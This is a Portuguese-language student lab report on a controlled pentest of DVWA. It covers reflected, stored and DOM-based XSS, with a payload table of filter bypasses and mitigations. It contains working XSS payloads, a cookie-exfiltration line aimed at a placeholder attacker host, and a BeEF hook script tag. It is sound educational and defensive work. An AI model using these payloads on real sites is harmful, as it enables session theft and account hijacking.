# Capa

UNIVERSIDADE REGIONAL DO NOROESTE DO ESTADO DO RIO GRANDE DO SUL — UNIJUÍ

Curso: [PREENCHER]

Disciplina: **Segurança de Dados**

Atividade: **Ferramentas de testes de intrusão (pentest)**

---

**DVWA e Cross-Site Scripting (XSS): Exploração Controlada e Análise de Segurança**

---

Integrantes do grupo:

- [NOME COMPLETO — MATRÍCULA]
- [NOME COMPLETO — MATRÍCULA]
- [NOME COMPLETO — MATRÍCULA]

Professor: Tiago Mallmann Rohde

Ijuí – RS, 2026

---
<!-- QUEBRA DE PÁGINA APÓS A CAPA -->

# Introdução

Este relatório documenta uma atividade de teste de intrusão (*pentest*) em aplicação web vulnerável, realizada em ambiente controlado sobre a aplicação **DVWA** (Damn Vulnerable Web Application). O foco é exclusivamente a exploração de **Cross-Site Scripting (XSS)** e sua relevância para a compreensão de falhas de validação de entrada e execução de código no contexto do navegador.

O XSS ocorre quando a aplicação incorpora dados controlados pelo usuário na resposta sem validação ou codificação adequada, permitindo a execução de JavaScript arbitrário no navegador da vítima. É uma das falhas mais persistentes em aplicações web (histórico no OWASP Top 10) por derivar de um erro conceitual simples: tratar **entrada do usuário como código** em vez de **dado**. O ambiente analisado roda em Docker, exposto em `http://localhost:4280` (bind `127.0.0.1`, isolado), com níveis de segurança ajustáveis (Low, Medium, High, Impossible) na aba *DVWA Security*.

# Objetivos da Análise

- **Identificar** os pontos vulneráveis a XSS nos três módulos: Reflected (`xss_r`), Stored (`xss_s`) e DOM-based (`xss_d`).
- **Compreender** o comportamento da interface diante de entradas maliciosas e como cada nível tenta (e falha em) filtrar payloads.
- **Avaliar** o impacto potencial da execução de scripts no lado do cliente — roubo de cookies, sequestro de sessão e ações autenticadas forjadas.
- **Contrastar** defesas por *blacklist* (Medium/High) com a abordagem correta de *output encoding* contextual (Impossible).

# Ferramentas Utilizadas

| Ferramenta | Uso na atividade |
|---|---|
| **DVWA** (Docker, `localhost:4280`) | Ambiente vulnerável de testes, com níveis de segurança ajustáveis. |
| **Navegador web + DevTools** | Submissão de payloads; inspeção do DOM e das requisições. |
| **curl** | Evidência da reflexão/persistência no HTML; *bypass* de `maxlength` (validação apenas client-side). |
| **BeEF** (porta 3000) | Demonstração de impacto pós-exploração (*hook* do navegador e captura de cookies). |

# Metodologia Aplicada

A exploração foi conduzida de forma **manual, controlada e incremental**, evitando automação massiva ou técnicas agressivas (explorar sem ser detectado). Para cada tipo de XSS percorreu-se a progressão **Low → Medium → High**: (1) leitura do código-fonte do nível para entender a barreira de defesa; (2) construção do *payload* mínimo capaz de contorná-la; (3) inserção via URL, formulário ou `curl`; (4) observação do comportamento no navegador e registro da evidência. O critério foi **orientado à análise de impacto** (demonstração de `document.cookie`). O nível **Impossible** foi analisado como referência de correção, não como alvo de exploração. Os comandos `curl` reprodutíveis e o procedimento BeEF estão detalhados no guia operacional que acompanha esta atividade.

# Resultados Obtidos

Confirmou-se XSS exploável nos três módulos em **todos** os níveis Low, Medium e High. A tabela consolida os payloads e o motivo da falha de cada filtro.

| Tipo | Nível | Payload utilizado | Por que o filtro falha |
|---|---|---|---|
| Reflected | Low | `<script>alert(document.cookie)</script>` | Sem filtro; concatenado cru em `<pre>`. |
| Reflected | Medium | `<img src=x onerror=alert(document.cookie)>` | `str_replace('<script>')` é literal/case-sensitive; `<img>` não o contém. |
| Reflected | High | `<svg/onload=alert(document.cookie)>` | Regex mira só *script*; ignora event handlers. |
| Stored | Low | `<script>alert(document.cookie)</script>` (Message) | Sem codificação de saída; persiste e executa a cada visita. |
| Stored | Medium | `<img src=x onerror=alert(document.cookie)>` (`name`) | Message blindado; campo `name` só remove `<script>` literal. |
| Stored | High | `<svg/onload=alert(document.cookie)>` (`name`) | `name` usa a mesma regex anti-*script*; `<svg>` passa. |
| DOM | Low | `?default=<script>alert(document.cookie)</script>` | Sem filtro; `document.write` injeta o script. |
| DOM | Medium | `?default=</option></select><img src=x onerror=alert(document.cookie)>` | `stripos('<script')` não vê `<img>`; quebra o contexto `<select>`. |
| DOM | High | `?default=English#<script>alert(document.cookie)</script>` | Fragmento `#` não vai ao servidor; sink lê `location.href`. |

**Reflected (`xss_r`)** — o parâmetro GET `name` é refletido em `<pre>Hello {name}</pre>`, sem codificação de saída. A progressão evidencia a falência da *blacklist*: o `header X-XSS-Protection: 0` desliga o filtro legado (Low); `<img onerror>` escapa do `str_replace` literal (Medium); `<svg/onload>` escapa da regex que só busca a palavra *script* (High). **[PRINT 1]**

**Stored (`xss_s`)** — guestbook persistente; o payload executa para **todo** visitante. A renderização (`dvwaGuestbook`) ecoa `name`/`comment` crus (codifica apenas no Impossible). O campo Message é blindado em Medium/High (`strip_tags` + `htmlspecialchars`), tornando o campo `name` o elo fraco. Os limites `maxlength` (10/50) são apenas client-side e ignorados por `curl`/DevTools. **[PRINT 2]**

**DOM-based (`xss_d`)** — Type-0: *source* = `location.href`, *sink* = `document.write`; o dado nunca trafega de volta ao servidor.

```javascript
var lang = location.href.substring(location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

O *bypass* High é estrutural: o servidor vê apenas `default=English` (válido na whitelist), mas o JavaScript lê `location.href` inteira, incluindo o fragmento `#` que, por RFC 3986, jamais alcança o servidor — nenhum log/WAF server-side o registra (relação direta com a meta de "explorar sem ser detectado"). **[PRINT 3]**

> **Nota:** mesmo quando o navegador percent-encoda `<`/`>` no fragmento (`%3Cscript%3E`), o `decodeURI()` do sink os reverte para `<`/`>` e o payload executa — confirmado nas capturas. É exatamente por isso que o nível Impossible **remove** o `decodeURI()`.

# Análise de Segurança

Todos os vetores levam ao mesmo resultado: **execução de JavaScript arbitrário na origem do DVWA com a sessão da vítima**. Os principais impactos:

- **Roubo de cookie / sequestro de sessão:** `new Image().src='http://atacante/c?'+document.cookie` exfiltra o `PHPSESSID`; o atacante reimporta o cookie e assume a sessão autenticada sem senha.
- **Defacement / phishing:** reescrita do DOM e injeção de login falso sobre o domínio legítimo (com HTTPS válido); *keylogging* via `addEventListener`.
- **Propagação (worm):** no Stored, o payload persiste e executa para todo visitante, podendo se auto-replicar.
- **Ações forjadas (XSS + CSRF):** no contexto autenticado, o script lê o próprio token CSRF da página antes de submeter requisições privilegiadas.

A lição transversal é que **blacklists são insuficientes por construção** — caem com variação de caixa, tag alternativa, aninhamento ou event handlers, e são impotentes contra DOM XSS via fragmento. A demonstração de impacto com **BeEF** confirma a gravidade: a partir do Stored Low injeta-se o *hook* (`<script src="http://<IP>:3000/hook.js"></script>`, via `curl` para furar o `maxlength`); o navegador-vítima aparece *hooked* no painel, permitindo executar comandos no contexto da sessão da vítima (leitura de cookies acessíveis, *keylogging*, navegação forjada).

**Observação empírica.** Nas capturas automatizadas, o `alert(document.cookie)` confirmou a execução do script nos **nove cenários**, porém o **`PHPSESSID` não foi exposto**: o servidor o define como `HttpOnly; SameSite=Strict`, tornando-o inacessível ao JavaScript. Isso demonstra, na prática, a eficácia do `HttpOnly` como **defesa em profundidade** — o XSS executa, mas o roubo direto do identificador de sessão via `document.cookie` (ou via *Get Cookies* do BeEF) é bloqueado. O cenário de exfiltração permanece válido para aplicações sem essa proteção; já os demais impactos (*keylogging*, *defacement* e ações forjadas) **independem** da leitura do cookie e seguem viáveis.

**Mitigações**

| Mitigação | Função |
|---|---|
| **Output encoding contextual** | Defesa primária. `htmlspecialchars()` converte `< > " & '` em entidades conforme o contexto (HTML, atributo, JS, URL). |
| **Validação por allowlist** | Aceita apenas valores/formatos esperados; complementa o encoding. |
| **Content Security Policy** | CSP estrita com `nonce` por requisição, sem `unsafe-inline`. Defesa em profundidade. |
| **Trusted Types** | Força sinks perigosos (`innerHTML`, `document.write`) a rejeitar strings cruas; elimina classes de DOM XSS. |
| **HttpOnly / Secure / SameSite** | `HttpOnly` impede a leitura via `document.cookie`, neutralizando o roubo direto de sessão. |

O nível **Impossible** do DVWA materializa a correção: aplica `htmlspecialchars()` na entrada e na renderização (a `dvwaGuestbook` só codifica nesse nível) somado a um **token anti-CSRF**; no DOM, remove o `decodeURI()` do sink, fazendo o `%3Cscript%3E` chegar ao `document.write` como texto literal e inerte.

# Conclusão

A análise confirmou XSS exploável nos três módulos (Reflected, Stored e DOM-based) em todos os níveis Low, Medium e High, com progressão didática clara: a **ausência de filtro** (Low) dá lugar a **blacklists ingênuas** (Medium/High), contornadas com vetores triviais — tags alternativas, event handlers, variação de caixa e, no caso DOM, o fragmento de URL que jamais alcança o servidor.

O principal aprendizado é conceitual: defender-se de XSS **não** é enumerar e remover o que parece perigoso, mas **codificar toda saída conforme o seu contexto**, tratando entrada do usuário sempre como dado. O nível Impossible exemplifica essa virada e serve de referência de código seguro por padrão, idealmente reforçado por CSP estrita, Trusted Types e cookies `HttpOnly/SameSite`. Como limitação, o DVWA é propositalmente simplificado (sinks diretos e provas com `alert()` em vez de exfiltração real), mas a mecânica de exploração e de defesa observada é diretamente transponível para aplicações de produção.

### Referências

- OWASP — Cross-Site Scripting Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP — DOM-based XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- MDN — Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
- MDN — Trusted Types API: https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
- BeEF Project: https://beefproject.com/
